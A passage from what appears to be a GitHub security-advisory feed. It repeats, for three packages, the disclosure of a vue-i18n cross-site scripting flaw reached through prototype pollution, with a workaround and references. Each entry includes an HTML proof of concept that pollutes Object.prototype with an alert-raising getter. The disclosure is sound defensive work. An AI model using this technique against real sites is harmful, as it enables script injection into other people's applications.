<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-9r9m-ffp6-9x4v">https://github.com/intlify/vue-i18n/security/advisories/GHSA-9r9m-ffp6-9x4v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52809">https://nvd.nist.gov/vuln/detail/CVE-2024-52809</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/72f0d323006fc7363b18cab62d4522dadd874411">https://github.com/intlify/vue-i18n/commit/72f0d323006fc7363b18cab62d4522dadd874411</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d">https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d</a></li>
<li><a href="https://github.com/advisories/GHSA-9r9m-ffp6-9x4v">https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T17:26:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@intlify/vue-i18n-core] vue-i18n has cross-site scripting vulnerability with prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</id>
        <link href="https://github.com/advisories/GHSA-9r9m-ffp6-9x4v"/>
        <updated>2024-12-02T17:26:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="vulnerability-type">Vulnerability type</h3>
<p>XSS</p>
<h3 id="description">Description</h3>
<p>vue-i18n can be passed locale messages to <code>createI18n</code> or <code>useI18n</code>.
we can then translate them using <code>t</code> and <code>$t</code>.
vue-i18n has its own syntax for local messages, and uses a message compiler to generate AST.
In order to maximize the performance of the translation function, vue-i18n uses bundler plugins such as <code>@intlify/unplugin-vue-i18n</code> and bulder to convert the AST in advance when building the application.
By using that AST as the locale message, it is no longer necessary to compile, and it is possible to translate using the AST.</p>
<p>The AST generated by the message compiler has special properties for each node in the AST tree to maximize performance. In the PoC example below, it is a <code>static</code> property, but that is just one of the optimizations.
About details of special properties, see <a href="https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts">https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts</a></p>
<p>In general, the locale messages of vue-i18n are optimized during production builds using <code>@intlify/unplugin-vue-i18n</code>,
so there is always a property that is attached during optimization like this time.
But if you are using a locale message AST in development mode or your own, there is a possibility of XSS if a third party injects.</p>
<h3 id="reproduce-poc">Reproduce (PoC)</h3>
<pre><code class="language-html">&lt;!doctype html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset="utf-8" /&gt;
    &lt;title&gt;vue-i18n XSS&lt;/title&gt;
    &lt;script src="https://unpkg.com/vue@3"&gt;&lt;/script&gt;
    &lt;script src="https://unpkg.com/vue-i18n@10"&gt;&lt;/script&gt;
    &lt;!-- Scripts that perform prototype contamination, such as being distributed from malicious hosting sites or injected through supply chain attacks, etc. --&gt;
    &lt;script&gt;
      /**
       * Prototype pollution vulnerability with `Object.prototype`.
       * The 'static' property is part of the optimized AST generated by the vue-i18n message compiler.
       * About details of special properties, see https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts
       *
       * In general, the locale messages of vue-i18n are optimized during production builds using `@intlify/unplugin-vue-i18n`,
       * so there is always a property that is attached during optimization like this time.
       * But if you are using a locale message AST in development or your own, there is a possibility of XSS if a third party injects prototype pollution code.
       */
      Object.defineProperty(Object.prototype, 'static', {
        configurable: true,
        get() {
          alert('prototype polluted!')
          return 'prototype pollution'
        }
      })
    &lt;/script&gt; 
 &lt;/head&gt;
  &lt;body&gt;
    &lt;div id="app"&gt;
      &lt;p&gt;{{ t('hello') }}&lt;/p&gt;
    &lt;/div&gt;
    &lt;script&gt;
      const { createApp } = Vue
      const { createI18n, useI18n } = VueI18n

      // AST style locale message, which build by `@intlify/unplugin-vue-i18n`
      const en = {
        hello: {
          type: 0,
          body: {
            items: [
              {
                type: 3,
                value: 'hello world!'
              }
            ]
          }
        }
      }

      const i18n = createI18n({
        legacy: false,
        locale: 'en',
        messages: {
          en
        }
      })

      const app = createApp({
        setup() {
          const { t } = useI18n()
          return { t }
        }
      })
      app.use(i18n)
      app.mount('#app')
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<p>Before v10.0.0, we can work around this vulnerability by using the regular compilation (<code>jit: false</code> of <code>@intlify/unplugin-vue-i18n</code> plugin configuration) way instead of jit compilation.</p>
<ul>
<li>jit compilation: <a href="https://vue-i18n.intlify.dev/guide/advanced/optimization.html#jit-compilation">https://vue-i18n.intlify.dev/guide/advanced/optimization.html#jit-compilation</a></li>
<li>bundler plugin option: <a href="https://github.com/intlify/bundle-tools/tree/main/packages/unplugin-vue-i18n#jitcompilation">https://github.com/intlify/bundle-tools/tree/main/packages/unplugin-vue-i18n#jitcompilation</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://www.herodevs.com/vulnerability-directory/cve-2024-6783">Simillar case: Vue 2 XSS vulnerability with prototype pollution</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-9r9m-ffp6-9x4v">https://github.com/intlify/vue-i18n/security/advisories/GHSA-9r9m-ffp6-9x4v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52809">https://nvd.nist.gov/vuln/detail/CVE-2024-52809</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/72f0d323006fc7363b18cab62d4522dadd874411">https://github.com/intlify/vue-i18n/commit/72f0d323006fc7363b18cab62d4522dadd874411</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d">https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d</a></li>
<li><a href="https://github.com/advisories/GHSA-9r9m-ffp6-9x4v">https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T17:26:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@intlify/core] vue-i18n has cross-site scripting vulnerability with prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</id>
        <link href="https://github.com/advisories/GHSA-9r9m-ffp6-9x4v"/>
        <updated>2024-12-02T17:26:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="vulnerability-type">Vulnerability type</h3>
<p>XSS</p>
<h3 id="description">Description</h3>
<p>vue-i18n can be passed locale messages to <code>createI18n</code> or <code>useI18n</code>.
we can then translate them using <code>t</code> and <code>$t</code>.
vue-i18n has its own syntax for local messages, and uses a message compiler to generate AST.
In order to maximize the performance of the translation function, vue-i18n uses bundler plugins such as <code>@intlify/unplugin-vue-i18n</code> and bulder to convert the AST in advance when building the application.
By using that AST as the locale message, it is no longer necessary to compile, and it is possible to translate using the AST.</p>
<p>The AST generated by the message compiler has special properties for each node in the AST tree to maximize performance. In the PoC example below, it is a <code>static</code> property, but that is just one of the optimizations.
About details of special properties, see <a href="https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts">https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts</a></p>
<p>In general, the locale messages of vue-i18n are optimized during production builds using <code>@intlify/unplugin-vue-i18n</code>,
so there is always a property that is attached during optimization like this time.
But if you are using a locale message AST in development mode or your own, there is a possibility of XSS if a third party injects.</p>
<h3 id="reproduce-poc">Reproduce (PoC)</h3>
<pre><code class="language-html">&lt;!doctype html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset="utf-8" /&gt;
    &lt;title&gt;vue-i18n XSS&lt;/title&gt;
    &lt;script src="https://unpkg.com/vue@3"&gt;&lt;/script&gt;
    &lt;script src="https://unpkg.com/vue-i18n@10"&gt;&lt;/script&gt;
    &lt;!-- Scripts that perform prototype contamination, such as being distributed from malicious hosting sites or injected through supply chain attacks, etc. --&gt;
    &lt;script&gt;
      /**
       * Prototype pollution vulnerability with `Object.prototype`.
       * The 'static' property is part of the optimized AST generated by the vue-i18n message compiler.
       * About details of special properties, see https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts
       *
       * In general, the locale messages of vue-i18n are optimized during production builds using `@intlify/unplugin-vue-i18n`,
       * so there is always a property that is attached during optimization like this time.
       * But if you are using a locale message AST in development or your own, there is a possibility of XSS if a third party injects prototype pollution code.
       */
      Object.defineProperty(Object.prototype, 'static', {
        configurable: true,
        get() {
          alert('prototype polluted!')
          return 'prototype pollution'
        }
      })
    &lt;/script&gt; 
 &lt;/head&gt;
  &lt;body&gt;
    &lt;div id="app"&gt;
      &lt;p&gt;{{ t('hello') }}&lt;/p&gt;
    &lt;/div&gt;
    &lt;script&gt;
      const { createApp } = Vue
      const { createI18n, useI18n } = VueI18n

      // AST style locale message, which build by `@intlify/unplugin-vue-i18n`
      const en = {
        hello: {
          type: 0,
          body: {
            items: [
              {
                type: 3,
                value: 'hello world!'
              }
            ]
          }
        }
      }

      const i18n = createI18n({
        legacy: false,
        locale: 'en',
        messages: {
          en
        }
      })

      const app = createApp({
        setup() {
          const { t } = useI18n()
          return { t }
        }
      })
      app.use(i18n)
      app.mount('#app')
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<p>Before v10.0.0, we can work around this vulnerability by using the regular compilation (<code>jit: false</code> of <code>@intlify/unplugin-vue-i18n</code> plugin configuration) way instead of jit compilation.</p>
<ul>
<li>jit compilation: <a href="https://vue-i18n.intlify.dev/guide/advanced/optimization.html#jit-compilation">https://vue-i18n.intlify.dev/guide/advanced/optimization.html#jit-compilation</a></li>
<li>bundler plugin option: <a href="https://github.com/intlify/bundle-tools/tree/main/packages/unplugin-vue-i18n#jitcompilation">https://github.com/intlify/bundle-tools/tree/main/packages/unplugin-vue-i18n#jitcompilation</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://www.herodevs.com/vulnerability-directory/cve-2024-6783">Simillar case: Vue 2 XSS vulnerability with prototype pollution</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-9r9m-ffp6-9x4v">https://github.com/intlify/vue-i18n/security/advisories/GHSA-9r9m-ffp6-9x4v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52809">https://nvd.nist.gov/vuln/detail/CVE-2024-52809</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/72f0d323006fc7363b18cab62d4522dadd874411">https://github.com/intlify/vue-i18n/commit/72f0d323006fc7363b18cab62d4522dadd874411</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d">https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d</a></li>
<li><a href="https://github.com/advisories/GHSA-9r9m-ffp6-9x4v">https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T17:26:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vue-i18n] vue-i18n has cross-site scripting vulnerability with prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</id>
        <link href="https://github.com/advisories/GHSA-9r9m-ffp6-9x4v"/>
        <updated>2024-12-02T17:26:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="vulnerability-type">Vulnerability type</h3>
<p>XSS</p>
<h3 id="description">Description</h3>
<p>vue-i18n can be passed locale messages to <code>createI18n</code> or <code>useI18n</code>.
we can then translate them using <code>t</code> and <code>$t</code>.
vue-i18n has its own syntax for local messages, and uses a message compiler to generate AST.
In order to maximize the performance of the translation function, vue-i18n uses bundler plugins such as <code>@intlify/unplugin-vue-i18n</code> and bulder to convert the AST in advance when building the application.
By using that AST as the locale message, it is no longer necessary to compile, and it is possible to translate using the AST.</p>
<p>The AST generated by the message compiler has special properties for each node in the AST tree to maximize performance. In the PoC example below, it is a <code>static</code> property, but that is just one of the optimizations.
About details of special properties, see <a href="https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts">https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts</a></p>
<p>In general, the locale messages of vue-i18n are optimized during production builds using <code>@intlify/unplugin-vue-i18n</code>,
so there is always a property that is attached during optimization like this time.
But if you are using a locale message AST in development mode or your own, there is a possibility of XSS if a third party injects.</p>
<h3 id="reproduce-poc">Reproduce (PoC)</h3>
<pre><code class="language-html">&lt;!doctype html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset="utf-8" /&gt;
    &lt;title&gt;vue-i18n XSS&lt;/title&gt;
    &lt;script src="https://unpkg.com/vue@3"&gt;&lt;/script&gt;
    &lt;script src="https://unpkg.com/vue-i18n@10"&gt;&lt;/script&gt;
    &lt;!-- Scripts that perform prototype contamination, such as being distributed from malicious hosting sites or injected through supply chain attacks, etc. --&gt;
    &lt;script&gt;
      /**
       * Prototype pollution vulnerability with `Object.prototype`.
       * The 'static' property is part of the optimized AST generated by the vue-i18n message compiler.
       * About details of special properties, see https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts
       *
       * In general, the locale messages of vue-i18n are optimized during production builds using `@intlify/unplugin-vue-i18n`,
       * so there is always a property that is attached during optimization like this time.
       * But if you are using a locale message AST in development or your own, there is a possibility of XSS if a third party injects prototype pollution code.
       */
      Object.defineProperty(Object.prototype, 'static', {
        configurable: true,
        get() {
          alert('prototype polluted!')
          return 'prototype pollution'
        }
      })
    &lt;/script&gt; 
 &lt;/head&gt;
  &lt;body&gt;
    &lt;div id="app"&gt;
      &lt;p&gt;{{ t('hello') }}&lt;/p&gt;
    &lt;/div&gt;
    &lt;script&gt;
      const { createApp } = Vue
      const { createI18n, useI18n } = VueI18n

      // AST style locale message, which build by `@intlify/unplugin-vue-i18n`
      const en = {
        hello: {
          type: 0,
          body: {
            items: [
              {
                type: 3,
                value: 'hello world!'
              }
            ]
          }
        }
      }

      const i18n = createI18n({
        legacy: false,
        locale: 'en',
        messages: {
          en
        }
      })

      const app = createApp({
        setup() {
          const { t } = useI18n()
          return { t }
        }
      })
      app.use(i18n)
      app.mount('#app')
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<p>Before v10.0.0, we can work around this vulnerability by using the regular compilation (<code>jit: false</code> of <code>@intlify/unplugin-vue-i18n</code> plugin configuration) way instead of jit compilation.</p>
<ul>
<li>jit compilation: <a href="https://vue-i18n.intlify.dev/guide/advanced/optimization.html#jit-compilation">https://vue-i18n.intlify.dev/guide/advanced/optimization.html#jit-compilation</a></li>
<li>bundler plugin option: <a href="https://github.com/intlify/bundle-tools/tree/main/packages/unplugin-vue-i18n#jitcompilation">https://github.com/intlify/bundle-tools/tree/main/packages/unplugin-vue-i18n#jitcompilation</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://www.herodevs.com/vulnerability-directory/cve-2024-6783">Simillar case: Vue 2 XSS vulnerability with prototype pollution</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-9r9m-ffp6-9x4v">https://github.com/intlify/vue-i18n/security/advisories/GHSA-9r9m-ffp6-9x4v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52809">https://nvd.nist.gov/vuln/detail/CVE-2024-52809</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/72f0d323006fc7363b18cab62d4522dadd874411">https://github.com/intlify/vue-i18n/commit/72f0d323006fc7363b18cab62d4522dadd874411</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d">https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d</a></li>
<li><a href="https://github.com/advisories/GHSA-9r9m-ffp6-9x4v">https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9r9m-ffp6-9x4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T17:26:20.000Z</published>
    </entry>
</feed>